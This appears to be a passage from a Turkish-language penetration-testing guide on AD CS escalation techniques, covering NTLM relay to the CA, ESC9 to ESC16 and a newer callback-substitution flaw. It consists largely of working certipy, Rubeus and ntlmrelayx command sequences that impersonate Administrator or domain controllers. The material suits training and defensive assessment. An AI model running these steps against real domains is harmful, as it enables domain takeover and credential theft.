`msPKI-Enrollment-Servers` özelliği, kurumsal Certificate Authority (CA) tarafından Certificate Enrollment Service (CES) uç noktalarını depolamak için kullanılır. Bu uç noktalar **Certutil.exe** aracı kullanılarak ayrıştırılabilir ve listelenebilir:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify ile Abuse
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

Certificate request, varsayılan olarak Certipy tarafından, relay edilen hesap adının `$` ile bitip bitmediğine göre `Machine` veya `User` template'i temel alınarak yapılır. Alternatif bir template belirtmek için `-template` parametresi kullanılabilir.

Daha sonra authentication'ı zorlamak için [PetitPotam](https://github.com/ly4k/PetitPotam) gibi bir teknik kullanılabilir. Domain controller'larla çalışırken `-template DomainController` belirtmek gerekir.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Güvenlik Uzantısı Yok - ESC9 <a href="#id-5485" id="id-5485"></a>

### Açıklama

ESC9 olarak adlandırılan **`msPKI-Enrollment-Flag`** için yeni **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) değeri, sertifikaya **yeni `szOID_NTDS_CA_SECURITY_EXT` security extension** eklenmesini engeller. Bu flag, `StrongCertificateBindingEnforcement` değeri `1` (varsayılan ayar) olarak ayarlandığında, `2` olarak ayarlanmasının aksine, önem kazanır. ESC9'un önemi, Kerberos veya Schannel için daha zayıf bir certificate mapping'in istismar edilebileceği senaryolarda (ESC10'da olduğu gibi) daha da artar; çünkü ESC9'un yokluğu gereksinimleri değiştirmez.<sup>[[7]](#references)</sup>

Bu flag'in ayarının önem kazandığı koşullar şunlardır:

- `StrongCertificateBindingEnforcement` değeri `2` olarak ayarlanmamıştır (varsayılan değer `1`'dir) veya `CertificateMappingMethods`, `UPN` flag'ini içerir.
- Sertifika, `msPKI-Enrollment-Flag` ayarı içinde `CT_FLAG_NO_SECURITY_EXTENSION` flag'i ile işaretlenmiştir.
- Sertifika tarafından herhangi bir client authentication EKU belirtilmiştir.
- Başka bir hesabı compromise etmek için herhangi bir hesap üzerinde `GenericWrite` izinleri mevcuttur.

### Abuse Scenario

`John@corp.local` hesabının `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olduğunu ve hedefin `Administrator@corp.local` hesabını compromise etmek olduğunu varsayalım. `Jane@corp.local` hesabının enroll olmasına izin verilen `ESC9` certificate template'i, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` flag'i ile yapılandırılmıştır.

İlk olarak, `John`'un `GenericWrite` izni sayesinde `Jane`'in hash'i Shadow Credentials kullanılarak elde edilir:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Ardından, `Jane`'in `userPrincipalName` değeri, `@corp.local` etki alanı kısmı kasıtlı olarak atlanarak `Administrator` olarak değiştirilir:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bu değişiklik, `Administrator@corp.local` değeri `Administrator` kullanıcısının `userPrincipalName` değerinden farklı kaldığından kısıtlamaları ihlal etmez.

Bunun ardından, savunmasız olarak işaretlenmiş `ESC9` sertifika şablonu `Jane` olarak istenir:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Sertifikanın `userPrincipalName` değerinin, herhangi bir “object SID” içermeden `Administrator` değerini yansıttığı görülür.

Ardından `Jane`'in `userPrincipalName` değeri orijinal hali olan `Jane@corp.local` olarak geri döndürülür:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Verilen sertifikayla kimlik doğrulaması yapılmaya çalışıldığında artık `Administrator@corp.local` hesabının NT hash'i elde edilir. Sertifikada domain belirtilmediği için komut `-domain <domain>` seçeneğini içermelidir:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Açıklama

Etki alanı denetleyicisindeki iki kayıt defteri anahtarı değeri ESC10 ile ilişkilendirilir:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` altındaki `CertificateMappingMethods` için varsayılan değer `0x18` (`0x8 | 0x10`), daha önce `0x1F` olarak ayarlanmıştı.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` altındaki `StrongCertificateBindingEnforcement` için varsayılan ayar `1`, daha önce `0` idi.<sup>[[7]](#references)</sup>

**Vaka 1**

`StrongCertificateBindingEnforcement` değeri `0` olarak yapılandırıldığında.

**Vaka 2**

`CertificateMappingMethods` değeri `UPN` bitini (`0x4`) içeriyorsa.

### Kötüye Kullanım Durumu 1

`StrongCertificateBindingEnforcement` değeri `0` olarak yapılandırıldığında, `GenericWrite` izinlerine sahip A hesabı, herhangi bir B hesabını ele geçirmek için istismar edilebilir.

Örneğin, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olan saldırgan, `Administrator@corp.local` hesabını ele geçirmeyi hedefler. Prosedür ESC9 ile aynıdır ve herhangi bir certificate template kullanılabilir.

İlk olarak `GenericWrite` kullanılarak Shadow Credentials üzerinden `Jane` hesabının hash'i alınır.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Ardından, `Jane`'in `userPrincipalName` değeri, kısıtlama ihlalini önlemek amacıyla `@corp.local` kısmı kasıtlı olarak çıkarılarak `Administrator` olarak değiştirilir.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bunun ardından, varsayılan `User` şablonu kullanılarak istemci kimlik doğrulamasını etkinleştiren bir sertifika `Jane` olarak istenir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName` değeri daha sonra orijinali olan `Jane@corp.local` olarak geri döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Elde edilen certificate ile authentication gerçekleştirildiğinde `Administrator@corp.local` hesabının NT hash değeri elde edilir. Certificate içinde domain bilgisi bulunmadığından komutta domain belirtilmesi gerekir.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

`CertificateMappingMethods` `UPN` bit flag'ini (`0x4`) içerdiğinde, `GenericWrite` izinlerine sahip A hesabı, `userPrincipalName` özelliği bulunmayan tüm B hesaplarını, makine hesapları ve yerleşik domain yöneticisi `Administrator` dahil, compromise edebilir.

Buradaki amaç, `GenericWrite` yetkisinden yararlanarak önce Shadow Credentials aracılığıyla `Jane` hesabının hash'ini elde etmek ve ardından `DC$@corp.local` hesabını compromise etmektir.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'in `userPrincipalName` değeri daha sonra `DC$@corp.local` olarak ayarlanır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
İstemci kimlik doğrulaması için varsayılan `User` şablonu kullanılarak `Jane` adına bir sertifika istenir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Bu işlemden sonra `Jane`'in `userPrincipalName` değeri özgün haline döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel üzerinden kimlik doğrulamak için Certipy’nin `-ldap-shell` seçeneği kullanılır ve kimlik doğrulamanın başarılı olduğu `u:CORP\DC$` olarak gösterilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell üzerinden `set_rbcd` gibi komutlar, Resource-Based Constrained Delegation (RBCD) saldırılarını etkinleştirerek domain controller'ın ele geçirilmesine yol açabilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Bu güvenlik açığı, `userPrincipalName` değerine sahip olmayan veya bu değer `sAMAccountName` ile eşleşmeyen tüm kullanıcı hesaplarını da etkiler. Varsayılan olarak `userPrincipalName` değerine sahip olmayan ve yükseltilmiş LDAP ayrıcalıkları nedeniyle birincil hedef olan `Administrator@corp.local` hesabı buna iyi bir örnektir.

## Relaying NTLM to ICPR - ESC11

### Açıklama

CA Server `IF_ENFORCEENCRYPTICERTREQUEST` ile yapılandırılmamışsa RPC service üzerinden imzalama olmadan NTLM relay saldırıları gerçekleştirilebilir. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

`Enforce Encryption for Requests` seçeneğinin Disabled olup olmadığını enumerate etmek için `certipy` kullanabilirsiniz; certipy `ESC11` Vulnerabilities olduğunu gösterecektir.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Senaryosu

Bir relay server kurulması gerekir:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Not: Domain controller'lar için DomainController'da `-template` belirtmeliyiz.

Veya [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) kullanarak:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## YubiHSM ile ADCS CA'ya Shell erişimi - ESC12

### Açıklama

Administrators, Certificate Authority'yi "Yubico YubiHSM2" gibi harici bir cihazda depolayacak şekilde yapılandırabilir.

USB device CA server'a bir USB portu üzerinden bağlıysa veya CA server bir virtual machine ise bir USB device server kullanılıyorsa, Key Storage Provider'ın YubiHSM'deki key'leri oluşturup kullanabilmesi için bir authentication key (bazen "password" olarak adlandırılır) gerekir.

Bu key/password, registry'de `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` altında cleartext olarak depolanır.

[Buradaki](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm) referans.<sup>[[11]](#references)</sup>

### Abuse Senaryosu

Shell erişimi elde ettiğinizde CA'nın private key'i fiziksel bir USB device üzerinde depolanıyorsa, key'i kurtarmak mümkündür.

İlk olarak CA certificate'ı (bu public'tir) edinmeniz ve ardından şunları yapmanız gerekir:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Son olarak, CA sertifikasını ve özel anahtarını kullanarak yeni bir rastgele sertifika oluşturmak için `certutil -sign` komutunu kullanın.

## OID Group Link Abuse - ESC13

### Açıklama

`msPKI-Certificate-Policy` özniteliği, issuance policy'nin certificate template'e eklenmesine olanak tanır. Issuance policy'leri oluşturmaktan sorumlu `msPKI-Enterprise-Oid` nesneleri, PKI OID container'ının Configuration Naming Context'inde (CN=OID,CN=Public Key Services,CN=Services) keşfedilebilir. Bir policy, bu nesnenin `msDS-OIDToGroupLink` özniteliği kullanılarak bir AD grubuna bağlanabilir. Böylece sistem, certificate sunan bir user'ı, bu user grup üyesiymiş gibi authorize edebilir. [Buradaki referans](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Başka bir deyişle, bir user'ın certificate enroll etme izni varsa ve certificate bir OID group'a bağlıysa, user bu grubun ayrıcalıklarını devralabilir.

OIDToGroupLink'i bulmak için [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kullanın:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Senaryosu

Bir kullanıcının sahip olduğu izinleri `certipy find` veya `Certify.exe find /showAllPermissions` ile bulun.

`John`, `VulnerableTemplate` üzerinde enroll iznine sahipse kullanıcı `VulnerableGroup` grubunun ayrıcalıklarını devralabilir.

Yapması gereken tek şey template'i belirtmektir; OIDToGroupLink haklarına sahip bir sertifika alacaktır.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### Açıklama

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping adresindeki açıklama son derece kapsamlıdır. Aşağıda özgün metinden bir alıntı yer almaktadır.<sup>[[14]](#references)</sup>

ESC14, temel olarak Active Directory kullanıcı veya bilgisayar hesaplarındaki `altSecurityIdentities` attribute'unun kötüye kullanılması ya da güvenli olmayan şekilde yapılandırılmasından kaynaklanan "weak explicit certificate mapping" güvenlik açıklarını ele alır. Çok değerli bu attribute, yöneticilerin kimlik doğrulama amacıyla X.509 sertifikalarını bir AD hesabıyla manuel olarak ilişkilendirmesine olanak tanır. Bu açık eşlemeler doldurulduğunda, genellikle sertifikanın SAN alanındaki UPN'lere veya DNS adlarına ya da `szOID_NTDS_CA_SECURITY_EXT` security extension içine gömülü SID'e dayanan varsayılan certificate mapping mantığını geçersiz kılabilir.

Bir "weak" mapping, `altSecurityIdentities` attribute içinde bir sertifikayı tanımlamak için kullanılan string değerinin fazla geniş, kolay tahmin edilebilir olması, benzersiz olmayan sertifika alanlarına dayanması veya kolayca spoof edilebilen sertifika bileşenlerini kullanması durumunda ortaya çıkar. Bir saldırgan, ayrıcalıklı bir hesap için weak şekilde tanımlanmış explicit mapping ile attribute'ları eşleşen bir sertifikayı elde edebilir veya oluşturabilirse, bu sertifikayı kullanarak söz konusu hesap olarak authenticate olabilir ve hesabı impersonate edebilir.

Potansiyel olarak weak `altSecurityIdentities` mapping string örnekleri şunlardır:

- Yalnızca yaygın bir Subject Common Name (CN) ile mapping yapılması: örneğin `X509:<S>CN=SomeUser`. Bir saldırgan, daha az güvenli bir kaynaktan bu CN'e sahip bir sertifika elde edebilir.
- Belirli bir serial number veya subject key identifier gibi ek nitelikler olmadan, aşırı genel Issuer Distinguished Name (DN) veya Subject DN kullanılması: örneğin `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Bir saldırganın meşru olarak elde edebileceği veya forge edebileceği bir sertifikada karşılayabileceği, tahmin edilebilir başka pattern'lerin ya da kriptografik olmayan identifier'ların kullanılması (bir CA compromise edilmişse veya ESC1'de olduğu gibi vulnerable bir template bulunmuşsa).

`altSecurityIdentities` attribute, mapping için çeşitli formatları destekler:

- `X509:<I>IssuerDN<S>SubjectDN` (tam Issuer ve Subject DN ile mapping yapar)
- `X509:<SKI>SubjectKeyIdentifier` (sertifikanın Subject Key Identifier extension değerine göre mapping yapar)
- `X509:<SR>SerialNumberBackedByIssuerDN` (serial number üzerinden mapping yapar; Issuer DN ile örtük olarak nitelendirilir) - bu bir standard format değildir; genellikle `<I>IssuerDN<SR>SerialNumber` kullanılır.
- `X509:<RFC822>EmailAddress` (SAN içindeki bir RFC822 name, genellikle bir email address üzerinden mapping yapar)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (sertifikanın raw public key değerinin SHA1 hash'i üzerinden mapping yapar - genellikle güçlüdür)

Bu mapping'lerin güvenliği, mapping string içinde kullanılan sertifika identifier'larının özgüllüğüne, benzersizliğine ve kriptografik gücüne büyük ölçüde bağlıdır. Domain Controller'larda güçlü certificate binding mode'ları etkin olsa bile (bunlar öncelikle SAN UPN'leri/DNS ve SID extension tabanlı implicit mapping'leri etkiler), kötü yapılandırılmış bir `altSecurityIdentities` girdisi, mapping mantığının kendisi hatalıysa veya fazla izin vericiyse impersonation için hâlâ doğrudan bir yol oluşturabilir.
### Abuse Senaryosu

ESC14, Active Directory'deki (AD) **explicit certificate mapping** yapılandırmalarını, özellikle de `altSecurityIdentities` attribute'unu hedefler. Bu attribute ayarlanmışsa (tasarım gereği veya yanlış yapılandırma nedeniyle), saldırganlar mapping ile eşleşen sertifikaları sunarak hesapları impersonate edebilir.

#### Senaryo A: Saldırgan `altSecurityIdentities` Attribute'una Yazabilir

**Ön koşul**: Saldırganın hedef hesabın `altSecurityIdentities` attribute'una yazma izinleri veya hedef AD object üzerinde aşağıdaki izinlerden biri aracılığıyla bu izni verme yetkisi vardır:
- `altSecurityIdentities` için Write property
- `Public-Information` için Write property
- Tüm özellikler için Write property
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Senaryo B: Hedefte Weak Mapping via X509RFC822 (Email) Bulunuyor

- **Ön koşul**: Hedefte `altSecurityIdentities` içinde weak bir X509RFC822 mapping bulunur. Saldırgan, victim'ın `mail` attribute'unu hedefin X509RFC822 name değeriyle eşleşecek şekilde ayarlayabilir, victim olarak bir sertifika enroll edebilir ve bu sertifikayı hedef olarak authenticate olmak için kullanabilir.
#### Senaryo C: Hedefte X509IssuerSubject Mapping Bulunuyor

- **Ön koşul**: Hedefte `altSecurityIdentities` içinde weak bir X509IssuerSubject explicit mapping bulunur. Saldırgan, bir victim principal üzerindeki `cn` veya `dNSHostName` attribute'unu hedefin X509IssuerSubject mapping'inin subject'iyle eşleşecek şekilde ayarlayabilir. Ardından saldırgan, victim olarak bir sertifika enroll edebilir ve bu sertifikayı hedef olarak authenticate olmak için kullanabilir.
#### Senaryo D: Hedefte X509SubjectOnly Mapping Bulunuyor

- **Ön koşul**: Hedefte `altSecurityIdentities` içinde weak bir X509SubjectOnly explicit mapping bulunur. Saldırgan, bir victim principal üzerindeki `cn` veya `dNSHostName` attribute'unu hedefin X509SubjectOnly mapping'inin subject'iyle eşleşecek şekilde ayarlayabilir. Ardından saldırgan, victim olarak bir sertifika enroll edebilir ve bu sertifikayı hedef olarak authenticate olmak için kullanabilir.
### Somut işlemler
#### Senaryo A

`Machine` certificate template'inden bir sertifika talep edin
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sertifikayı kaydedin ve dönüştürün
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Kimlik doğrulama (sertifikayı kullanarak)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Temizleme (isteğe bağlı)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Daha spesifik attack methods ve çeşitli attack senaryoları için lütfen şuna başvurun: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Uygulama Politikaları(CVE-2024-49019) - ESC15

### Açıklama

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc adresindeki açıklama son derece kapsamlıdır. Aşağıda orijinal metinden bir alıntı yer almaktadır.<sup>[[15]](#references)</sup>

Yerleşik varsayılan version 1 certificate templates kullanılarak attacker, template içinde belirtilen yapılandırılmış Extended Key Usage attributes yerine tercih edilen application policies değerlerini içerecek şekilde bir CSR oluşturabilir. Tek gereksinim enrollment rights değeridir ve **_WebServer_** template kullanılarak client authentication, certificate request agent ve codesigning certificates oluşturmak için kullanılabilir.

### Abuse

[Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), daha ayrıntılı kullanım örnekleri içerir.<sup>[[14]](#references)</sup>


Certipy'nin `find` command'i, CA'ya patch uygulanmamışsa ESC15'e karşı potansiyel olarak savunmasız V1 templates'leri belirlemeye yardımcı olabilir.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Senaryo A: Schannel Üzerinden Doğrudan Impersonation

**1. Adım: "Client Authentication" Application Policy ve hedef UPN'i enjekte ederek bir certificate talep edin.** `attacker@corp.local` saldırganı, enrollee-supplied subject özelliğine izin veren "WebServer" V1 template'ini kullanarak `administrator@corp.local` hesabını hedefler.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: "Enrollee supplies subject" içeren güvenlik açığı bulunan V1 template.
- `-application-policies 'Client Authentication'`: `1.3.6.1.5.5.7.3.2` OID'sini CSR'nin Application Policies extension'ına enjekte eder.
- `-upn 'administrator@corp.local'`: Impersonation için UPN'yi SAN'da ayarlar.

**Step 2: Elde edilen sertifikayı kullanarak Schannel (LDAPS) üzerinden kimlik doğrulaması yapın.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Senaryo B: Enrollment Agent Abuse aracılığıyla PKINIT/Kerberos Impersonation

**1. Adım: "Enrollee supplies subject" özelliğine sahip bir V1 template üzerinden, "Certificate Request Agent" Application Policy enjekte ederek bir certificate talep edin.** Bu certificate, saldırganın (`attacker@corp.local`) bir enrollment agent olmasını sağlamak içindir. Burada saldırganın kendi kimliği için herhangi bir UPN belirtilmez; çünkü amaç agent yeteneğini elde etmektir.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` değerini ekler.

**Adım 2: "agent" sertifikasını kullanarak hedef ayrıcalıklı kullanıcı adına bir sertifika isteyin.** Bu, 1. Adım'daki sertifikayı agent sertifikası olarak kullanan ESC3 benzeri bir adımdır.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Adım 3: "on-behalf-of" sertifikasını kullanarak ayrıcalıklı kullanıcı olarak Authenticate olun.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA'de Security Extension Devre Dışı (Global)-ESC16

### Açıklama

**ESC16 (Eksik szOID_NTDS_CA_SECURITY_EXT Extension üzerinden Privilege Escalation)**, AD CS yapılandırmasının **szOID_NTDS_CA_SECURITY_EXT** extension'ının tüm sertifikalara eklenmesini zorunlu kılmaması durumunu ifade eder. Bu durumda bir attacker şunları gerçekleştirebilir:

1. **SID binding olmadan** bir sertifika istemek.

2. Bu sertifikayı **herhangi bir hesap olarak authentication** gerçekleştirmek için kullanmak; örneğin yüksek ayrıcalıklı bir hesabı (Domain Administrator gibi) taklit etmek.

Ayrıntılı prensip hakkında daha fazla bilgi edinmek için şu makaleye de başvurabilirsiniz:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

Aşağıdaki bilgiler [bu bağlantıda](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) referans gösterilmiştir. Daha ayrıntılı kullanım yöntemlerini görmek için tıklayın.<sup>[[14]](#references)</sup>

Active Directory Certificate Services (AD CS) ortamının **ESC16**'ya karşı vulnerable olup olmadığını belirlemek için
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Adım 1: Kurban hesabın başlangıç UPN'sini okuyun (İsteğe bağlı - geri yükleme için).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Adım 2: Kurban hesabın UPN'sini hedef yöneticinin `sAMAccountName` değerine güncelleyin.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Adım 3: (Gerekirse) "victim" hesabı için kimlik bilgilerini elde edin (ör. Shadow Credentials aracılığıyla).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Adım 4: ESC16'e karşı savunmasız CA üzerindeki _uygun herhangi bir client authentication template_'inden (ör. "User") "victim" user olarak bir sertifika talep edin.** CA ESC16'e karşı savunmasız olduğundan, template'in bu extension için özel ayarlarından bağımsız olarak, verilen sertifikadan SID security extension'ı otomatik olarak çıkarır. Kerberos credential cache environment variable'ını ayarlayın (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Ardından sertifikayı isteyin:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**5. Adım: "victim" hesabının UPN'sini geri alın.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**6. Adım: Hedef yöneticisi olarak kimlik doğrulaması yapın.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Açıklama

**Certighost**, CA'nın verilen sertifikaya yerleştirilmesi gereken kimliği çözümlemek için requester-supplied request attributes'a güvendiği bir **AD CS enrollment chase / callback path**'i kötüye kullanır. Public PoC'de oluşturulan request şunları içerir:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CA'nın bağlantı kuracağı attacker-controlled host/IP
- **`rmd`**: Taklit edilecek **target Domain Controller DNS name**

CA bu chase'i izlerse **SMB/LSA (`445`)** ve **LDAP (`389`)** üzerinden attacker'a bağlanır. Attacker, callback session'ın geçerli bir domain principal olarak authenticate olması için **real machine account** (genellikle varsayılan **`ms-DS-MachineAccountQuota`** kullanılarak oluşturulur) kullanır; ancak rogue services bunun yerine **target DC**'nin identity attributes değerlerini döndürür:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CA, **returned identity'yi authenticated callback principal'a cryptographically bind etmiyorsa**, session attacker-controlled machine account olarak authenticate olmuş olsa bile **Domain Controller** için bir certificate düzenleyebilir. Bu durum bug'ı kavramsal olarak **Certifried**'dan farklı kılar: Attacker, `dNSHostName` gibi AD attributes değerlerini yeniden yazmak yerine, **CA callback resolution sırasında identity data'yı değiştirir**.<sup>[[2]](#references)</sup>

**Useful preconditions:**

- Düşük yetkili **domain credentials**
